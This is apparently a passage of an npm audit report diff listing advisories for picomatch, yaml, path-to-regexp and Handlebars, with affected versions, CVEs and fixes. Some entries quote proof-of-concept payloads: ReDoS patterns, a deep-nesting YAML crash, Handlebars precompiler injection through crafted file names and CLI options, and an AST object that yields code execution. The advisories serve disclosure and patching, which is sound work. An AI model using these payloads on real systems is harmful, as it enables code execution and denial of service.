+      "overview": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)",
+      "reported_by": null,
+      "title": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+      "metadata": null,
+      "cves": ["CVE-2026-33671"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-c2c7-rcm5-vvqj",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": ["CWE-1333"],
+      "url": "https://github.com/advisories/GHSA-c2c7-rcm5-vvqj"
+    },
+    "1115555": {
+      "findings": [
+        {
+          "version": "1.10.2",
+          "paths": [
+            "packages__web>@builder.io/react>@emotion/core>@emotion/css>babel-plugin-emotion>babel-plugin-macros>cosmiconfig>yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/eemeli/yaml/security/advisories/GHSA-48c2-rrv3-qjmp\n- https://github.com/eemeli/yaml/commit/1e84ebbea7ec35011a4c61bbb820a529ee4f359b\n- https://github.com/eemeli/yaml/releases/tag/v1.10.3\n- https://github.com/eemeli/yaml/releases/tag/v2.8.3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33532\n- https://github.com/advisories/GHSA-48c2-rrv3-qjmp",
+      "created": "2026-03-25T20:08:24.000Z",
+      "id": 1115555,
+      "npm_advisory_id": null,
+      "overview": "Parsing a YAML document with `yaml` may throw a RangeError due to a stack overflow.\n\nThe node resolution/composition phase uses recursive function calls without a depth bound. An attacker who can supply YAML for parsing can trigger a `RangeError: Maximum call stack size exceeded` with a small payload (~2ΓÇô10 KB). The `RangeError` is not a `YAMLParseError`, so applications that only catch YAML-specific errors will encounter an unexpected exception type. Depending on the host application's exception handling, this can fail requests or terminate the Node.js process.\n\nFlow sequences allow deep nesting with minimal bytes (2 bytes per level: one `[` and one `]`). On the default Node.js stack, approximately 1,000ΓÇô5,000 levels of nesting (2ΓÇô10 KB input) exhaust the call stack. The exact threshold is environment-dependent (Node.js version, stack size, call stack depth at invocation).\n\nNote: the library's `Parser` (CST phase) uses a stack-based iterative approach and is not affected. Only the compose/resolve phase uses actual call-stack recursion.\n\nAll three public parsing APIs are affected: `YAML.parse()`, `YAML.parseDocument()`, and `YAML.parseAllDocuments()`.\n\n### PoC\n\n```javascript\nconst YAML = require('yaml');\n\n// ~10 KB payload: 5000 levels of nested flow sequences\nconst payload = '['.repeat(5000) + '1' + ']'.repeat(5000);\n\ntry {\n  YAML.parse(payload);\n} catch (e) {\n  console.log(e.constructor.name); // RangeError (NOT YAMLParseError)\n  console.log(e.message);          // Maximum call stack size exceeded\n}\n```\n\nTest environment: Node.js v24.12.0, macOS darwin arm64\n\n| Version | Nesting Depth | Input Size | Result |\n|---|---|---|---|\n| 1.0.0 | 5,000 | 10,001 B | RangeError |\n| 1.10.2 | 5,000 | 10,001 B | RangeError |\n| 2.0.0 | 5,000 | 10,001 B | RangeError |\n| 2.8.2 | 5,000 | 10,001 B | RangeError |\n| 2.8.3 | 5,000 | 10,001 B | YAMLParseError |\n\nDepth threshold on yaml 2.8.2:\n\n| Nesting Depth | Input Size | Result |\n|---|---|---|\n| 500 | 1,001 B | Parses successfully |\n| 1,000 | 2,001 B | RangeError (threshold varies by stack size) |\n| 5,000 | 10,001 B | RangeError |",
+      "reported_by": null,
+      "title": "yaml is vulnerable to Stack Overflow via deeply nested YAML collections",
+      "metadata": null,
+      "cves": ["CVE-2026-33532"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "yaml",
+      "vulnerable_versions": ">=1.0.0 <1.10.3",
+      "github_advisory_id": "GHSA-48c2-rrv3-qjmp",
+      "recommendation": "Upgrade to version 1.10.3 or later",
+      "patched_versions": ">=1.10.3",
+      "updated": "2026-03-27T21:34:54.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": ["CWE-674"],
+      "url": "https://github.com/advisories/GHSA-48c2-rrv3-qjmp"
+    },
+    "1115556": {
+      "findings": [
+        {
+          "version": "2.8.2",
+          "paths": ["packages__cli>yaml"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/eemeli/yaml/security/advisories/GHSA-48c2-rrv3-qjmp\n- https://github.com/eemeli/yaml/commit/1e84ebbea7ec35011a4c61bbb820a529ee4f359b\n- https://github.com/eemeli/yaml/releases/tag/v1.10.3\n- https://github.com/eemeli/yaml/releases/tag/v2.8.3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33532\n- https://github.com/advisories/GHSA-48c2-rrv3-qjmp",
+      "created": "2026-03-25T20:08:24.000Z",
+      "id": 1115556,
+      "npm_advisory_id": null,
+      "overview": "Parsing a YAML document with `yaml` may throw a RangeError due to a stack overflow.\n\nThe node resolution/composition phase uses recursive function calls without a depth bound. An attacker who can supply YAML for parsing can trigger a `RangeError: Maximum call stack size exceeded` with a small payload (~2ΓÇô10 KB). The `RangeError` is not a `YAMLParseError`, so applications that only catch YAML-specific errors will encounter an unexpected exception type. Depending on the host application's exception handling, this can fail requests or terminate the Node.js process.\n\nFlow sequences allow deep nesting with minimal bytes (2 bytes per level: one `[` and one `]`). On the default Node.js stack, approximately 1,000ΓÇô5,000 levels of nesting (2ΓÇô10 KB input) exhaust the call stack. The exact threshold is environment-dependent (Node.js version, stack size, call stack depth at invocation).\n\nNote: the library's `Parser` (CST phase) uses a stack-based iterative approach and is not affected. Only the compose/resolve phase uses actual call-stack recursion.\n\nAll three public parsing APIs are affected: `YAML.parse()`, `YAML.parseDocument()`, and `YAML.parseAllDocuments()`.\n\n### PoC\n\n```javascript\nconst YAML = require('yaml');\n\n// ~10 KB payload: 5000 levels of nested flow sequences\nconst payload = '['.repeat(5000) + '1' + ']'.repeat(5000);\n\ntry {\n  YAML.parse(payload);\n} catch (e) {\n  console.log(e.constructor.name); // RangeError (NOT YAMLParseError)\n  console.log(e.message);          // Maximum call stack size exceeded\n}\n```\n\nTest environment: Node.js v24.12.0, macOS darwin arm64\n\n| Version | Nesting Depth | Input Size | Result |\n|---|---|---|---|\n| 1.0.0 | 5,000 | 10,001 B | RangeError |\n| 1.10.2 | 5,000 | 10,001 B | RangeError |\n| 2.0.0 | 5,000 | 10,001 B | RangeError |\n| 2.8.2 | 5,000 | 10,001 B | RangeError |\n| 2.8.3 | 5,000 | 10,001 B | YAMLParseError |\n\nDepth threshold on yaml 2.8.2:\n\n| Nesting Depth | Input Size | Result |\n|---|---|---|\n| 500 | 1,001 B | Parses successfully |\n| 1,000 | 2,001 B | RangeError (threshold varies by stack size) |\n| 5,000 | 10,001 B | RangeError |",
+      "reported_by": null,
+      "title": "yaml is vulnerable to Stack Overflow via deeply nested YAML collections",
+      "metadata": null,
+      "cves": ["CVE-2026-33532"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "yaml",
+      "vulnerable_versions": ">=2.0.0 <2.8.3",
+      "github_advisory_id": "GHSA-48c2-rrv3-qjmp",
+      "recommendation": "Upgrade to version 2.8.3 or later",
+      "patched_versions": ">=2.8.3",
+      "updated": "2026-03-27T21:34:54.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": ["CWE-674"],
+      "url": "https://github.com/advisories/GHSA-48c2-rrv3-qjmp"
+    },
+    "1115573": {
+      "findings": [
+        {
+          "version": "8.3.0",
+          "paths": ["packages__api>express>router>path-to-regexp"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-j3q9-mxjg-w52f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4926\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-j3q9-mxjg-w52f",
+      "created": "2026-03-27T22:23:27.000Z",
+      "id": 1115573,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA bad regular expression is generated any time you have multiple sequential optional groups (curly brace syntax), such as `{a}{b}{c}:z`. The generated regex grows exponentially with the number of groups, causing denial of service.\n\n### Patches\n\nFixed in version 8.4.0.\n\n### Workarounds\n\nLimit the number of sequential optional groups in route patterns. Avoid passing user-controlled input as route patterns.",
+      "reported_by": null,
+      "title": "path-to-regexp vulnerable to Denial of Service via sequential optional groups",
+      "metadata": null,
+      "cves": ["CVE-2026-4926"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": ">=8.0.0 <8.4.0",
+      "github_advisory_id": "GHSA-j3q9-mxjg-w52f",
+      "recommendation": "Upgrade to version 8.4.0 or later",
+      "patched_versions": ">=8.4.0",
+      "updated": "2026-03-27T22:23:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": ["CWE-400", "CWE-1333"],
+      "url": "https://github.com/advisories/GHSA-j3q9-mxjg-w52f"
+    },
+    "1115582": {
+      "findings": [
+        {
+          "version": "8.3.0",
+          "paths": ["packages__api>express>router>path-to-regexp"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-27v5-c462-wpq7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4923\n- https://cna.openjsf.org/security-advisories.html\n- https://makenowjust-labs.github.io/recheck/playground\n- https://github.com/advisories/GHSA-27v5-c462-wpq7",
+      "created": "2026-03-27T22:23:52.000Z",
+      "id": 1115582,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen using multiple wildcards, combined with at least one parameter, a regular expression can be generated that is vulnerable to ReDoS. This backtracking vulnerability requires the second wildcard to be somewhere other than the end of the path.\n\n**Unsafe examples:**\n\n```\n/*foo-*bar-:baz\n/*a-:b-*c-:d\n/x/*a-:b/*c/y\n```\n\n**Safe examples:**\n\n```\n/*foo-:bar\n/*foo-:bar-*baz\n```\n\n### Patches\n\nUpgrade to version `8.4.0`.\n\n### Workarounds\n\nIf developers are using multiple wildcard parameters, they can check the regex output with a tool such as https://makenowjust-labs.github.io/recheck/playground/ to confirm whether a path is vulnerable.",
+      "reported_by": null,
+      "title": "path-to-regexp vulnerable to Regular Expression Denial of Service via multiple wildcards",
+      "metadata": null,
+      "cves": ["CVE-2026-4923"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": ">=8.0.0 <8.4.0",
+      "github_advisory_id": "GHSA-27v5-c462-wpq7",
+      "recommendation": "Upgrade to version 8.4.0 or later",
+      "patched_versions": ">=8.4.0",
+      "updated": "2026-03-27T22:23:55.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": ["CWE-1333"],
+      "url": "https://github.com/advisories/GHSA-27v5-c462-wpq7"
+    },
+    "1115588": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": ["packages__adapters>ts-jest>handlebars"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-7rx3-28cr-v5wh\n- https://github.com/advisories/GHSA-765h-qjxv-5f44\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://github.com/advisories/GHSA-7rx3-28cr-v5wh",
+      "created": "2026-03-29T15:17:15.000Z",
+      "id": 1115588,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe prototype method blocklist in `lib/handlebars/internal/proto-access.js` blocks `constructor`, `__defineGetter__`, `__defineSetter__`, and `__lookupGetter__`, but omits the symmetric `__lookupSetter__`. This omission is only exploitable when the non-default runtime option `allowProtoMethodsByDefault: true` is explicitly set ΓÇö in that configuration `__lookupSetter__` becomes accessible while its counterparts remain blocked, creating an inconsistent security boundary.\n\n`4.6.0` is the version that introduced `protoAccessControl` and the `allowProtoMethodsByDefault` runtime option.\n\n## Description\n\nIn `lib/handlebars/internal/proto-access.js`:\n\n```javascript\nconst methodWhiteList = Object.create(null);\nmethodWhiteList['constructor']      = false;\nmethodWhiteList['__defineGetter__'] = false;\nmethodWhiteList['__defineSetter__'] = false;\nmethodWhiteList['__lookupGetter__'] = false;\n// __lookupSetter__ intentionally blocked in CVE-2021-23383,\n// but omitted here ΓÇö creating an asymmetric blocklist\n```\n\nAll four legacy accessor helpers (`__defineGetter__`, `__defineSetter__`, `__lookupGetter__`, `__lookupSetter__`) were involved in the exploit chain addressed by CVE-2021-23383. Three of the four were explicitly blocked; `__lookupSetter__` was left out.\n\nWhen `allowProtoMethodsByDefault: true` is set, any prototype method **not present** in `methodWhiteList` is permitted by default. Because `__lookupSetter__` is absent from the list, it passes the `checkWhiteList` check and is accessible in templates, while `__lookupGetter__` (its sibling) is correctly denied.\n\n## Workarounds\n\n- Do **not** set `allowProtoMethodsByDefault: true`. The default configuration is not affected.\n- If `allowProtoMethodsByDefault` must be enabled, ensure templates do not reference  `__lookupSetter__` through untrusted input.",
+      "reported_by": null,
+      "title": "Handlebars.js has a Prototype Method Access Control Gap via Missing __lookupSetter__ Blocklist Entry",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.6.0 <=4.7.8",
+      "github_advisory_id": "GHSA-7rx3-28cr-v5wh",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-29T15:17:16.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": ["CWE-1321"],
+      "url": "https://github.com/advisories/GHSA-7rx3-28cr-v5wh"
+    },
+    "1115589": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": ["packages__adapters>ts-jest>handlebars"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-442j-39wm-28r2\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://github.com/advisories/GHSA-442j-39wm-28r2",
+      "created": "2026-03-29T15:16:37.000Z",
+      "id": 1115589,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nIn `lib/handlebars/runtime.js`, the `container.lookup()` function uses `container.lookupProperty()` as a gate check to enforce prototype-access controls, but then discards the validated result and performs a second, unguarded property access (`depths[i][name]`). This Time-of-Check Time-of-Use (TOCTOU) pattern means the security check and the actual read are decoupled, and the raw access bypasses any sanitization that `lookupProperty` may perform.\n\nOnly relevant when the **compat** compile option is enabled (`{compat: true}`), which activates `depthedLookup` in `lib/handlebars/compiler/javascript-compiler.js`.\n\n## Description\n\nThe vulnerable code in `lib/handlebars/runtime.js` (lines 137ΓÇô144):\n\n```javascript\nlookup: function (depths, name) {\n  const len = depths.length;\n  for (let i = 0; i < len; i++) {\n    let result = depths[i] && container.lookupProperty(depths[i], name);\n    if (result != null) {\n      return depths[i][name];  // BUG: should be `return result;`\n    }\n  }\n},\n```\n\n`container.lookupProperty()` (lines 119ΓÇô136) enforces `hasOwnProperty` checks and `resultIsAllowed()` prototype-access controls. However, `container.lookup()` only uses `lookupProperty` as a boolean gate ΓÇö if the gate passes (`result != null`), it then performs an independent, raw `depths[i][name]` access that circumvents any transformation or wrapped value that `lookupProperty` may have returned.\n\n## Workarounds\n\n- Avoid enabling `{ compat: true }` when rendering templates that include untrusted data.\n- Ensure context data objects are plain JSON (no Proxies, no getter-based accessor properties).",
+      "reported_by": null,
+      "title": "Handlebars.js has a Property Access Validation Bypass in container.lookup",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-442j-39wm-28r2",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-29T15:16:37.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": ["CWE-367"],
+      "url": "https://github.com/advisories/GHSA-442j-39wm-28r2"
+    },
+    "1115692": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": ["packages__adapters>ts-jest>handlebars"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xjpj-3mr7-gcpf\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33941\n- https://github.com/advisories/GHSA-xjpj-3mr7-gcpf",
+      "created": "2026-03-27T18:22:10.000Z",
+      "id": 1115692,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe Handlebars CLI precompiler (`bin/handlebars` / `lib/precompiler.js`) concatenates user-controlled strings ΓÇö template file names and several CLI options ΓÇö directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.\n\n## Description\n\n`lib/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:\n\n### 1. Template name injection\n\n```javascript\n// Vulnerable code pattern\noutput += 'templates[\"' + template.name + '\"] = template(...)';\n```\n\n`template.name` is derived from the file system path. A filename containing `\"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.\n\n### 2. Namespace injection (`-n` / `--namespace`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';\n```\n\n`opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.\n\n### 3. CommonJS path injection (`-c` / `--commonjs`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var Handlebars = require(\"' + opts.commonjs + '\");';\n```\n\n`opts.commonjs` is interpolated inside double quotes with no escaping, allowing `\"` to close the string and inject further code.\n\n### 4. AMD path injection (`-h` / `--handlebarPath`)\n\n```javascript\n// Vulnerable code pattern\noutput += \"define(['\" + opts.handlebarPath + \"handlebars.runtime'], ...)\";\n```\n\n`opts.handlebarPath` is interpolated inside single quotes, allowing `'` to close the array element.\n\nAll four injection points result in code that executes when the generated bundle is `require()`d or loaded in a browser.\n\n## Proof of Concept\n\n**Template name vector (creates a file `pwned` on disk):**\n\n```bash\nmkdir -p templates\nprintf 'Hello' > \"templates/evil'] = (function(){require(\\\"fs\\\").writeFileSync(\\\"pwned\\\",\\\"1\\\")})(); //.handlebars\"\n\nnode bin/handlebars templates -o out.js\nnode -e 'require(\"./out.js\")'  # Executes injected code, creates ./pwned\n```\n\n**Namespace vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -n \"App.ns; require('fs').writeFileSync('pwned2','1'); //\"\nnode -e 'require(\"./out.js\")'\n```\n\n**CommonJS vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -c 'handlebars\"); require(\"fs\").writeFileSync(\"pwned3\",\"1\"); //'\nnode -e 'require(\"./out.js\")'\n```\n\n**AMD vector:**\n\n```bash\nnode bin/handlebars templates -o out.js -a \\\n  -h \"'); require('fs').writeFileSync('pwned4','1'); // \"\nnode -e 'require(\"./out.js\")'\n```\n\n## Workarounds\n\n- **Validate all CLI inputs** before invoking the precompiler. Reject filenames and option values  that contain characters with JavaScript string-escaping significance (`\"`, `'`, `;`, etc.).\n- **Use a fixed, trusted namespace string** passed via a configuration file rather than  command-line arguments in automated pipelines.\n- **Run the precompiler in a sandboxed environment** (container with no write access to sensitive  paths) to limit the impact of successful exploitation.\n- **Audit template filenames** in any repository or package that is consumed by an automated  build pipeline.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection in CLI Precompiler via Unescaped Names and Options",
+      "metadata": null,
+      "cves": ["CVE-2026-33941"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-xjpj-3mr7-gcpf",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-30T20:08:53.000Z",
+      "cvss": {
+        "score": 8.3,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"
+      },
+      "cwe": ["CWE-79", "CWE-94", "CWE-116"],
+      "url": "https://github.com/advisories/GHSA-xjpj-3mr7-gcpf"
+    },
+    "1115693": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": ["packages__adapters>ts-jest>handlebars"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xhpv-hc6g-r9c6\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33940\n- https://github.com/advisories/GHSA-xhpv-hc6g-r9c6",
+      "created": "2026-03-27T18:21:44.000Z",
+      "id": 1115693,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA crafted object placed in the template context can bypass all conditional guards in `resolvePartial()` and cause `invokePartial()` to return `undefined`. The Handlebars runtime then treats the unresolved partial as a source that needs to be compiled, passing the crafted object to `env.compile()`. Because the object is a valid Handlebars AST containing injected code, the generated JavaScript executes arbitrary commands on the server. The attack requires the adversary to control a value that can be returned by a dynamic partial lookup.\n\n## Description\n\nThe vulnerable code path spans two functions in `lib/handlebars/runtime.js`:\n\n**`resolvePartial()`:** A crafted object with `call: true` satisfies the first branch condition (`partial.call`) and causes an early return of the original object itself, because none of the remaining conditionals (string check, `options.partials` lookup, etc.) match a plain object. The function returns the crafted object as-is.\n\n**`invokePartial()`:** When `resolvePartial` returns a non-function object, `invokePartial` produces `undefined`. The runtime interprets `undefined` as \"partial not yet compiled\" and calls `env.compile(partial, ...)` where `partial` is the crafted AST object. The JavaScript code generator processes the AST and emits JavaScript containing the injected payload, which is then evaluated.\n\n**Minimum prerequisites:**\n1. The template uses a dynamic partial lookup: `{{> (lookup . \"key\")}}` or equivalent.\n2. The adversary can set the value of the looked-up context property to a crafted object.\n\nIn server-side rendering scenarios where templates process user-supplied context data, this enables full Remote Code Execution.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars');\n\nconst vulnerableTemplate = `{{> (lookup . \"payload\")}}`;\n\nconst maliciousContext = {\n  payload: {\n    call: true, // bypasses the primary resolvePartial branch\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          // Injected code breaks out of the generated function's argument list\n          depth: \"0])),function () {console.error('VULNERABLE: object -> dynamic partial -> RCE');}()));//\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n// Prints: VULNERABLE: object -> dynamic partial -> RCE\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars/runtime')`). Without `compile()`,  the fallback compilation path in `invokePartial` is unreachable.\n- **Sanitize context data** before rendering: ensure no value in the context is a non-primitive  object that could be passed to a dynamic partial.\n- **Avoid dynamic partial lookups** (`{{> (lookup ...)}}`) when context data is user-controlled.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection via AST Type Confusion when passing an object as dynamic partial",
+      "metadata": null,
+      "cves": ["CVE-2026-33940"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-xhpv-hc6g-r9c6",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-30T20:08:34.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": ["CWE-94", "CWE-843"],
+      "url": "https://github.com/advisories/GHSA-xhpv-hc6g-r9c6"
+    },
+    "1115694": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": ["packages__adapters>ts-jest>handlebars"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-9cx6-37pm-9jff\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33939\n- https://github.com/advisories/GHSA-9cx6-37pm-9jff",
+      "created": "2026-03-27T18:21:15.000Z",
+      "id": 1115694,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen a Handlebars template contains decorator syntax referencing an unregistered decorator (e.g. `{{*n}}`), the compiled template calls `lookupProperty(decorators, \"n\")`, which returns `undefined`. The runtime then immediately invokes the result as a function, causing an unhandled `TypeError: ... is not a function` that crashes the Node.js process. Any application that compiles user-supplied templates without wrapping the call in a `try/catch` is vulnerable to a single-request Denial of Service.\n\n## Description\n\nIn `lib/handlebars/compiler/javascript-compiler.js`, the code generated for a decorator invocation looks like:\n\n```javascript\nfn = lookupProperty(decorators, \"n\")(fn, props, container, options) || fn;\n```\n\nWhen `\"n\"` is not a registered decorator, `lookupProperty(decorators, \"n\")` returns `undefined`. The expression immediately attempts to call `undefined` as a function, producing:\n\n```\nTypeError: lookupProperty(...) is not a function\n```\n\nBecause the error is thrown inside the compiled template function and is not caught by the runtime, it propagates up as an unhandled exception and ΓÇö when not caught by the application ΓÇö crashes the Node.js process.\n\nThis inconsistency is notable: references to unregistered **helpers** produce a clean `\"Missing helper: ...\"` error, while references to unregistered **decorators** cause a hard crash.\n\n**Attack scenario:** An attacker submits `{{*n}}` as template content to any endpoint that calls `Handlebars.compile(userInput)()`. Each request crashes the server process; with process managers that auto-restart (PM2, systemd), repeated submissions create a persistent DoS.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars'); // Handlebars 4.7.8, Node.js v22.x\n\n// Any of these payloads crash the process\nHandlebars.compile('{{*n}}')({});\nHandlebars.compile('{{*decorator}}')({});\nHandlebars.compile('{{*constructor}}')({});\n```\n\nExpected crash output:\n```\nTypeError: lookupProperty(...) is not a function\n    at Function.eval [as decorator] (eval at compile (...javascript-compiler.js:134:36))\n```\n\n## Workarounds\n\n- **Wrap compilation and rendering in `try/catch`:**\n  ```javascript\n  try {\n    const result = Handlebars.compile(userInput)(context);\n    res.send(result);\n  } catch (err) {\n    res.status(400).send('Invalid template');\n  }\n  ```\n- **Validate template input** before passing it to `compile()`. Reject templates containing  decorator syntax (`{{*...}}`) if decorators are not used in your application.\n- **Use the pre-compilation workflow:** compile templates at build time and serve only pre-compiled  templates; do not call `compile()` at request time.",
+      "reported_by": null,
+      "title": "Handlebars.js has Denial of Service via Malformed Decorator Syntax in Template Compilation",
+      "metadata": null,
